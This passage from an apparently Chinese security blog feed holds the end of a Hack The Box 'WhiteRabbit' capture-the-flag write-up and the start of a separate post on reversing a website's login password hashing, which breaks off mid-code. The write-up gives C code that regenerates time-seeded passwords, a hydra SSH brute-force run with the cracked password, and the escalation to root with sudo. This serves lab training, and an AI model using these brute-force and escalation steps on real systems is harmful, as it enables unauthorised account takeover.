<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$chmod</span> 600 morpheus</span><br><span class="line">$ ssh -i morpheus morpheus@whiterabbit.htb</span><br><span class="line">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">'unminimize'</span> <span class="built_in">command</span>.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Apr 7 16:30:39 2025 from 10.10.16.86</span><br><span class="line">morpheus@whiterabbit:~$</span><br></pre></td></tr></tbody></table></figure>

<p>读取user.txt获取flag</p>
<h2 id="逆向密码生成器爆破出密码提权"><a href="#逆向密码生成器爆破出密码提权" class="headerlink" title="逆向密码生成器爆破出密码提权"></a>逆向密码生成器爆破出密码提权</h2><p>接下来要尝试获取root权限，考虑数据库查看到的密码生成器<code>/opt/neo-password-generator/neo-password-generator</code>，下载下来分析</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .</span><br></pre></td></tr></tbody></table></figure>

<p>放到IDA分析</p>
<img src="/posts/25594414/image-20250408011716119.png" class="" title="image-20250408011716119">

<p><code>generate_password</code>函数用当前时间戳作为函数，生成20位密码</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">generate_password</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  srand(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s[i] = aAbcdefghijklmn[rand() % <span class="number">62</span>];</span><br><span class="line">  s[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>我们只需要还原程序，然后在<code>2024-08-30 14:40:42</code>的接下来1000毫秒生成密码字典去爆破，就能拿到<code>neo</code>的密码。</p>
<p>经过还原修改后如下</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> charset[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generate_password</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seed)</span> {</span><br><span class="line">    <span class="type">char</span> password[<span class="number">24</span>];</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i) {</span><br><span class="line">        password[i] = charset[rand() % <span class="number">62</span>];</span><br><span class="line">    }</span><br><span class="line">    password[<span class="number">20</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(password);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">long</span> timestamp = <span class="number">1725028842</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ms = <span class="number">0</span>; ms &lt; <span class="number">1000</span>; ms++) {</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> seed = (timestamp * <span class="number">1000</span>) + ms;</span><br><span class="line">        generate_password(seed);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>编译运行，用<code>hydra</code>进行爆破</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ gcc -static -o pass passwd.c</span><br><span class="line">$ ./pass &gt; password.txt</span><br><span class="line">$ hydra -l neo -P password.txt ssh://whiterabbit.htb          </span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 13:05:58</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task</span><br><span class="line">[DATA] attacking ssh://whiterabbit.htb:22/</span><br><span class="line">[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 2 final worker threads did not complete <span class="keyword">until</span> end.</span><br><span class="line">[ERROR] 2 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 13:06:08</span><br></pre></td></tr></tbody></table></figure>

<p>获取到密码为<code>WBSxhWgfnMiclrV4dqfj</code>，登录账户</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">morpheus@whiterabbit:~$ su neo</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">id</span></span><br><span class="line">uid=1000(neo) gid=1000(neo) <span class="built_in">groups</span>=1000(neo),27(<span class="built_in">sudo</span>)</span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> neo: </span><br><span class="line"><span class="built_in">sudo</span>: 1 incorrect password attempt</span><br><span class="line"></span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> neo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> neo on whiterabbit:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User neo may run the following commands on whiterabbit:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    </span><br><span class="line">neo@whiterabbit:/home/morpheus$ <span class="built_in">sudo</span> -i</span><br><span class="line"></span><br><span class="line">root@whiterabbit:~#</span><br></pre></td></tr></tbody></table></figure>

<p>读取<code>root.txt</code>即可获取flag</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	这个靶场感觉真的很难，首先巩固了信息收集技巧，不断地去拓扑，获取更多信息，增大攻击面。然后是这次的Web漏洞，并不是常规的直接进行sql注入，而是需要去分析服务端执行过程，有点像白盒。也是第一次使用flask代理sqlmap，上手实操了一次，也疏通了以前对于工具使用固化的地方，可以说是开拓了新思路。后面获取服务器的权限，容器内和逃逸都利用了<code>Restic</code>，也让我感觉到了其实漏洞并不是固化的东西，巧妙的思路最重要。然后就是最后的提权操作，纯逆向小白（），也是让我体验了一把逆向的乐趣。</p>
]]></content>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>js逆向</title>
    <url>/posts/42054/</url>
    <content><![CDATA[<h3 id="微信公众号加密算法分析"><a href="#微信公众号加密算法分析" class="headerlink" title="微信公众号加密算法分析"></a>微信公众号加密算法分析</h3><p>打开谷歌开发者工具，登录账户密码抓包。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">username:</span> <span class="number">1234</span></span><br><span class="line"><span class="attr">pwd:</span> <span class="string">81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></tbody></table></figure>

<p>查看调用栈，发现几个和<code>loginpage</code>相关，打上断点。</p>
<img src="/posts/42054/image-20250312004307050.png" class="" title="image-20250312004307050">

<p>重新登录，开始调试</p>
<img src="/posts/42054/image-20250312005430526.png" class="" title="image-20250312005430526">

<p>在第一个断点处并未加密，跳到下一个断点</p>
<img src="/posts/42054/image-20250312005550419.png" class="" title="image-20250312005550419">

<p>这里<code>pwd</code>也还未加密，继续调试</p>
<img src="/posts/42054/image-20250312005630018.png" class="" title="image-20250312005630018">

<p>仍未加密，跳到<code>p</code>函数处下断点，继续调试</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">k.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">n, u, i</span>) {</span><br><span class="line">    <span class="keyword">if</span> (!u) {</span><br><span class="line">        <span class="keyword">if</span> (!i) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">x</span>(n)</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">B</span>(n)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!i) {</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">R</span>(u, n)</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">M</span>(u, n)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">// x(n)</span></span><br><span class="line"><span class="comment">// '81dc9bdb52d04dc20036dbd8313ed055'</span></span><br></pre></td></tr></tbody></table></figure>

<p>那么这里就找到了加密函数位置，将代码复制到本地，改为自执行函数，并将上述函数结果用<code>getStr</code>变量接收。同时不能忘记加上<code>substr()</code>。</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">pwd</span>: <span class="title function_">p</span>(r.<span class="property">pwd</span>.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">16</span>))</span><br></pre></td></tr></tbody></table></figure>

<p>那么最终代码如下</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getStr</span><br><span class="line">!<span class="keyword">function</span>(<span class="params">I, T, h</span>) {</span><br><span class="line">    <span class="string">"use strict"</span>;</span><br><span class="line">    <span class="keyword">var</span> v;</span><br><span class="line">    ;!(v = <span class="keyword">function</span>(<span class="params">m, D, k</span>) {</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">_</span>(<span class="params">n, u</span>) {</span><br><span class="line">            <span class="keyword">var</span> i = (n &amp; <span class="number">65535</span>) + (u &amp; <span class="number">65535</span>)</span><br><span class="line">                , b = (n &gt;&gt; <span class="number">16</span>) + (u &gt;&gt; <span class="number">16</span>) + (i &gt;&gt; <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">return</span> b &lt;&lt; <span class="number">16</span> | i &amp; <span class="number">65535</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">E</span>(<span class="params">n, u</span>) {</span><br><span class="line">            <span class="keyword">return</span> n &lt;&lt; u | n &gt;&gt;&gt; <span class="number">32</span> - u</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params">n, u, i, b, S, j</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_</span>(<span class="title function_">E</span>(<span class="title function_">_</span>(<span class="title function_">_</span>(u, n), <span class="title function_">_</span>(b, j)), S), i)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">n, u, i, b, S, j, F</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(u &amp; i | ~u &amp; b, n, u, S, j, F)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">n, u, i, b, S, j, F</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(u &amp; b | i &amp; ~b, n, u, S, j, F)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">n, u, i, b, S, j, F</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(u ^ i ^ b, n, u, S, j, F)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">n, u, i, b, S, j, F</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(i ^ (u | ~b), n, u, S, j, F)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">n, u</span>) {</span><br><span class="line">            n[u &gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; u % <span class="number">32</span>;</span><br><span class="line">            n[(u + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">14</span>] = u;</span><br><span class="line">            <span class="keyword">var</span> i, b, S, j, F, s = <span class="number">1732584193</span>, o = -<span class="number">271733879</span>, a = -<span class="number">1732584194</span>, t = <span class="number">271733878</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n.<span class="property">length</span>; i += <span class="number">16</span>) {</span><br><span class="line">                b = s;</span><br><span class="line">                S = o;</span><br><span class="line">                j = a;</span><br><span class="line">                F = t;</span><br><span class="line">                s = <span class="title function_">C</span>(s, o, a, t, n[i], <span class="number">7</span>, -<span class="number">680876936</span>);</span><br><span class="line">                t = <span class="title function_">C</span>(t, s, o, a, n[i + <span class="number">1</span>], <span class="number">12</span>, -<span class="number">389564586</span>);</span><br><span class="line">                a = <span class="title function_">C</span>(a, t, s, o, n[i + <span class="number">2</span>], <span class="number">17</span>, <span class="number">606105819</span>);</span><br><span class="line">                o = <span class="title function_">C</span>(o, a, t, s, n[i + <span class="number">3</span>], <span class="number">22</span>, -<span class="number">1044525330</span>);</span><br><span class="line">                s = <span class="title function_">C</span>(s, o, a, t, n[i + <span class="number">4</span>], <span class="number">7</span>, -<span class="number">176418897</span>);</span><br><span class="line">                t = <span class="title function_">C</span>(t, s, o, a, n[i + <span class="number">5</span>], <span class="number">12</span>, <span class="number">1200080426</span>);</span><br><span class="line">                a = <span class="title function_">C</span>(a, t, s, o, n[i + <span class="number">6</span>], <span class="number">17</span>, -<span class="number">1473231341</span>);</span><br><span class="line">                o = <span class="title function_">C</span>(o, a, t, s, n[i + <span class="number">7</span>], <span class="number">22</span>, -<span class="number">45705983</span>);</span><br><span class="line">                s = <span class="title function_">C</span>(s, o, a, t, n[i + <span class="number">8</span>], <span class="number">7</span>, <span class="number">1770035416</span>);</span><br><span class="line">                t = <span class="title function_">C</span>(t, s, o, a, n[i + <span class="number">9</span>], <span class="number">12</span>, -<span class="number">1958414417</span>);</span><br><span class="line">                a = <span class="title function_">C</span>(a, t, s, o, n[i + <span class="number">10</span>], <span class="number">17</span>, -<span class="number">42063</span>);</span><br><span class="line">                o = <span class="title function_">C</span>(o, a, t, s, n[i + <span class="number">11</span>], <span class="number">22</span>, -<span class="number">1990404162</span>);</span><br><span class="line">                s = <span class="title function_">C</span>(s, o, a, t, n[i + <span class="number">12</span>], <span class="number">7</span>, <span class="number">1804603682</span>);</span><br><span class="line">                t = <span class="title function_">C</span>(t, s, o, a, n[i + <span class="number">13</span>], <span class="number">12</span>, -<span class="number">40341101</span>);</span><br><span class="line">                a = <span class="title function_">C</span>(a, t, s, o, n[i + <span class="number">14</span>], <span class="number">17</span>, -<span class="number">1502002290</span>);</span><br><span class="line">                o = <span class="title function_">C</span>(o, a, t, s, n[i + <span class="number">15</span>], <span class="number">22</span>, <span class="number">1236535329</span>);</span><br><span class="line">                s = <span class="title function_">d</span>(s, o, a, t, n[i + <span class="number">1</span>], <span class="number">5</span>, -<span class="number">165796510</span>);</span><br><span class="line">                t = <span class="title function_">d</span>(t, s, o, a, n[i + <span class="number">6</span>], <span class="number">9</span>, -<span class="number">1069501632</span>);</span><br><span class="line">                a = <span class="title function_">d</span>(a, t, s, o, n[i + <span class="number">11</span>], <span class="number">14</span>, <span class="number">643717713</span>);</span><br><span class="line">                o = <span class="title function_">d</span>(o, a, t, s, n[i], <span class="number">20</span>, -<span class="number">373897302</span>);</span><br><span class="line">                s = <span class="title function_">d</span>(s, o, a, t, n[i + <span class="number">5</span>], <span class="number">5</span>, -<span class="number">701558691</span>);</span><br><span class="line">                t = <span class="title function_">d</span>(t, s, o, a, n[i + <span class="number">10</span>], <span class="number">9</span>, <span class="number">38016083</span>);</span><br><span class="line">                a = <span class="title function_">d</span>(a, t, s, o, n[i + <span class="number">15</span>], <span class="number">14</span>, -<span class="number">660478335</span>);</span><br><span class="line">                o = <span class="title function_">d</span>(o, a, t, s, n[i + <span class="number">4</span>], <span class="number">20</span>, -<span class="number">405537848</span>);</span><br><span class="line">                s = <span class="title function_">d</span>(s, o, a, t, n[i + <span class="number">9</span>], <span class="number">5</span>, <span class="number">568446438</span>);</span><br><span class="line">                t = <span class="title function_">d</span>(t, s, o, a, n[i + <span class="number">14</span>], <span class="number">9</span>, -<span class="number">1019803690</span>);</span><br><span class="line">                a = <span class="title function_">d</span>(a, t, s, o, n[i + <span class="number">3</span>], <span class="number">14</span>, -<span class="number">187363961</span>);</span><br><span class="line">                o = <span class="title function_">d</span>(o, a, t, s, n[i + <span class="number">8</span>], <span class="number">20</span>, <span class="number">1163531501</span>);</span><br><span class="line">                s = <span class="title function_">d</span>(s, o, a, t, n[i + <span class="number">13</span>], <span class="number">5</span>, -<span class="number">1444681467</span>);</span><br><span class="line">                t = <span class="title function_">d</span>(t, s, o, a, n[i + <span class="number">2</span>], <span class="number">9</span>, -<span class="number">51403784</span>);</span><br><span class="line">                a = <span class="title function_">d</span>(a, t, s, o, n[i + <span class="number">7</span>], <span class="number">14</span>, <span class="number">1735328473</span>);</span><br><span class="line">                o = <span class="title function_">d</span>(o, a, t, s, n[i + <span class="number">12</span>], <span class="number">20</span>, -<span class="number">1926607734</span>);</span><br><span class="line">                s = <span class="title function_">l</span>(s, o, a, t, n[i + <span class="number">5</span>], <span class="number">4</span>, -<span class="number">378558</span>);</span><br><span class="line">                t = <span class="title function_">l</span>(t, s, o, a, n[i + <span class="number">8</span>], <span class="number">11</span>, -<span class="number">2022574463</span>);</span><br><span class="line">                a = <span class="title function_">l</span>(a, t, s, o, n[i + <span class="number">11</span>], <span class="number">16</span>, <span class="number">1839030562</span>);</span><br><span class="line">                o = <span class="title function_">l</span>(o, a, t, s, n[i + <span class="number">14</span>], <span class="number">23</span>, -<span class="number">35309556</span>);</span><br><span class="line">                s = <span class="title function_">l</span>(s, o, a, t, n[i + <span class="number">1</span>], <span class="number">4</span>, -<span class="number">1530992060</span>);</span><br><span class="line">                t = <span class="title function_">l</span>(t, s, o, a, n[i + <span class="number">4</span>], <span class="number">11</span>, <span class="number">1272893353</span>);</span><br><span class="line">                a = <span class="title function_">l</span>(a, t, s, o, n[i + <span class="number">7</span>], <span class="number">16</span>, -<span class="number">155497632</span>);</span><br><span class="line">                o = <span class="title function_">l</span>(o, a, t, s, n[i + <span class="number">10</span>], <span class="number">23</span>, -<span class="number">1094730640</span>);</span><br><span class="line">                s = <span class="title function_">l</span>(s, o, a, t, n[i + <span class="number">13</span>], <span class="number">4</span>, <span class="number">681279174</span>);</span><br><span class="line">                t = <span class="title function_">l</span>(t, s, o, a, n[i], <span class="number">11</span>, -<span class="number">358537222</span>);</span><br><span class="line">                a = <span class="title function_">l</span>(a, t, s, o, n[i + <span class="number">3</span>], <span class="number">16</span>, -<span class="number">722521979</span>);</span><br><span class="line">                o = <span class="title function_">l</span>(o, a, t, s, n[i + <span class="number">6</span>], <span class="number">23</span>, <span class="number">76029189</span>);</span><br><span class="line">                s = <span class="title function_">l</span>(s, o, a, t, n[i + <span class="number">9</span>], <span class="number">4</span>, -<span class="number">640364487</span>);</span><br><span class="line">                t = <span class="title function_">l</span>(t, s, o, a, n[i + <span class="number">12</span>], <span class="number">11</span>, -<span class="number">421815835</span>);</span><br><span class="line">                a = <span class="title function_">l</span>(a, t, s, o, n[i + <span class="number">15</span>], <span class="number">16</span>, <span class="number">530742520</span>);</span><br><span class="line">                o = <span class="title function_">l</span>(o, a, t, s, n[i + <span class="number">2</span>], <span class="number">23</span>, -<span class="number">995338651</span>);</span><br><span class="line">                s = <span class="title function_">p</span>(s, o, a, t, n[i], <span class="number">6</span>, -<span class="number">198630844</span>);</span><br><span class="line">                t = <span class="title function_">p</span>(t, s, o, a, n[i + <span class="number">7</span>], <span class="number">10</span>, <span class="number">1126891415</span>);</span><br><span class="line">                a = <span class="title function_">p</span>(a, t, s, o, n[i + <span class="number">14</span>], <span class="number">15</span>, -<span class="number">1416354905</span>);</span><br><span class="line">                o = <span class="title function_">p</span>(o, a, t, s, n[i + <span class="number">5</span>], <span class="number">21</span>, -<span class="number">57434055</span>);</span><br><span class="line">                s = <span class="title function_">p</span>(s, o, a, t, n[i + <span class="number">12</span>], <span class="number">6</span>, <span class="number">1700485571</span>);</span><br><span class="line">                t = <span class="title function_">p</span>(t, s, o, a, n[i + <span class="number">3</span>], <span class="number">10</span>, -<span class="number">1894986606</span>);</span><br><span class="line">                a = <span class="title function_">p</span>(a, t, s, o, n[i + <span class="number">10</span>], <span class="number">15</span>, -<span class="number">1051523</span>);</span><br><span class="line">                o = <span class="title function_">p</span>(o, a, t, s, n[i + <span class="number">1</span>], <span class="number">21</span>, -<span class="number">2054922799</span>);</span><br><span class="line">                s = <span class="title function_">p</span>(s, o, a, t, n[i + <span class="number">8</span>], <span class="number">6</span>, <span class="number">1873313359</span>);</span><br><span class="line">                t = <span class="title function_">p</span>(t, s, o, a, n[i + <span class="number">15</span>], <span class="number">10</span>, -<span class="number">30611744</span>);</span><br><span class="line">                a = <span class="title function_">p</span>(a, t, s, o, n[i + <span class="number">6</span>], <span class="number">15</span>, -<span class="number">1560198380</span>);</span><br><span class="line">                o = <span class="title function_">p</span>(o, a, t, s, n[i + <span class="number">13</span>], <span class="number">21</span>, <span class="number">1309151649</span>);</span><br><span class="line">                s = <span class="title function_">p</span>(s, o, a, t, n[i + <span class="number">4</span>], <span class="number">6</span>, -<span class="number">145523070</span>);</span><br><span class="line">                t = <span class="title function_">p</span>(t, s, o, a, n[i + <span class="number">11</span>], <span class="number">10</span>, -<span class="number">1120210379</span>);</span><br><span class="line">                a = <span class="title function_">p</span>(a, t, s, o, n[i + <span class="number">2</span>], <span class="number">15</span>, <span class="number">718787259</span>);</span><br><span class="line">                o = <span class="title function_">p</span>(o, a, t, s, n[i + <span class="number">9</span>], <span class="number">21</span>, -<span class="number">343485551</span>);</span><br><span class="line">                s = <span class="title function_">_</span>(s, b);</span><br><span class="line">                o = <span class="title function_">_</span>(o, S);</span><br><span class="line">                a = <span class="title function_">_</span>(a, j);</span><br><span class="line">                t = <span class="title function_">_</span>(t, F)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> [s, o, a, t]</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">var</span> u, i = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (u = <span class="number">0</span>; u &lt; n.<span class="property">length</span> * <span class="number">32</span>; u += <span class="number">8</span>) {</span><br><span class="line">                i += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(n[u &gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; u % <span class="number">32</span> &amp; <span class="number">255</span>)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">var</span> u, i = [];</span><br><span class="line">            i[(n.<span class="property">length</span> &gt;&gt; <span class="number">2</span>) - <span class="number">1</span>] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (u = <span class="number">0</span>; u &lt; i.<span class="property">length</span>; u += <span class="number">1</span>) {</span><br><span class="line">                i[u] = <span class="number">0</span></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">for</span> (u = <span class="number">0</span>; u &lt; n.<span class="property">length</span> * <span class="number">8</span>; u += <span class="number">8</span>) {</span><br><span class="line">                i[u &gt;&gt; <span class="number">5</span>] |= (n.<span class="title function_">charCodeAt</span>(u / <span class="number">8</span>) &amp; <span class="number">255</span>) &lt;&lt; u % <span class="number">32</span></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">L</span>(<span class="title function_">f</span>(<span class="title function_">y</span>(n), n.<span class="property">length</span> * <span class="number">8</span>))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">q</span>(<span class="params">n, u</span>) {</span><br><span class="line">            <span class="keyword">var</span> i, b = <span class="title function_">y</span>(n), S = [], j = [], F;</span><br><span class="line">            S[<span class="number">15</span>] = j[<span class="number">15</span>] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (b.<span class="property">length</span> &gt; <span class="number">16</span>) {</span><br><span class="line">                b = <span class="title function_">f</span>(b, n.<span class="property">length</span> * <span class="number">8</span>)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">1</span>) {</span><br><span class="line">                S[i] = b[i] ^ <span class="number">909522486</span>;</span><br><span class="line">                j[i] = b[i] ^ <span class="number">1549556828</span></span><br><span class="line">            }</span><br><span class="line">            F = <span class="title function_">f</span>(S.<span class="title function_">concat</span>(<span class="title function_">y</span>(u)), <span class="number">512</span> + u.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">L</span>(<span class="title function_">f</span>(j.<span class="title function_">concat</span>(F), <span class="number">512</span> + <span class="number">128</span>))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">z</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">var</span> u = <span class="string">"0123456789abcdef"</span>, i = <span class="string">""</span>, b, S;</span><br><span class="line">            <span class="keyword">for</span> (S = <span class="number">0</span>; S &lt; n.<span class="property">length</span>; S += <span class="number">1</span>) {</span><br><span class="line">                b = n.<span class="title function_">charCodeAt</span>(S);</span><br><span class="line">                i += u.<span class="title function_">charAt</span>(b &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>) + u.<span class="title function_">charAt</span>(b &amp; <span class="number">15</span>)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Q</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(n))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">B</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">return</span> $(<span class="title function_">Q</span>(n))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">n</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">z</span>(<span class="title function_">B</span>(n))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">M</span>(<span class="params">n, u</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">q</span>(<span class="title function_">Q</span>(n), <span class="title function_">Q</span>(u))</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">R</span>(<span class="params">n, u</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">z</span>(<span class="title function_">M</span>(n, u))</span><br><span class="line">        }</span><br><span class="line">        getStr = <span class="keyword">function</span>(<span class="params">n, u, i</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!u) {</span><br><span class="line">                <span class="keyword">if</span> (!i) {</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_">x</span>(n)</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span 